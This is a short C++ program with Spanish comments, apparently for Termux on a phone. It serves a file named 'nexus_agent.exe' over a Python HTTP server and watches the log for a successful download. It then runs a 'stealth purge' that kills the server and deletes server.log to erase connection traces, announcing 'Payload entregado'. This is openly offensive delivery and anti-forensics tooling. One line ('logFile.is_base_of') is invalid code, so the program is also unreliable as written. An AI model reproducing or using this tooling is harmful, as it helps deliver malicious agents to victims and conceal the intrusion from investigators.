#include <iostream>
#include <fstream>
#include <string>
#include <unistd.h>

void stealth_cleanup() {
    std::cout << "\033[1;31m[!] Descarga Detectada. Iniciando Purga de Sigilo...\033[0m" << std::endl;
    system("pkill -f python3"); // Mata el servidor al instante
    system("rm -f server.log");   // Elimina rastro de conexiones
    system("termux-vibrate -d 1000"); // Vibración larga de éxito
    system("termux-tts-speak 'Payload entregado. Servidor cerrado por seguridad.'");
}

int main() {
    std::cout << "\033[1;36m[*] NEXUS STEALTH: Servidor activo en puerto 9090...\033[0m" << std::endl;
    
    // Lanzar servidor redirigiendo salida a un log para monitoreo
    system("python3 -m http.server 9090 > server.log 2>&1 &");

    while (true) {
        std::ifstream logFile("server.log");
        std::string line;
        if (logFile.is_base_of) {
            while (std::getline(logFile, line)) {
                // Buscamos la confirmación de la descarga del agente
                if (line.find("GET /nexus_agent.exe HTTP/1.1\" 200") != std::string::npos) {
                    stealth_cleanup();
                    return 0;
                }
            }
        }
        usleep(500000); // Poll cada 0.5 segundos para ahorrar CPU en el Moto E15
    }
    return 0;
}
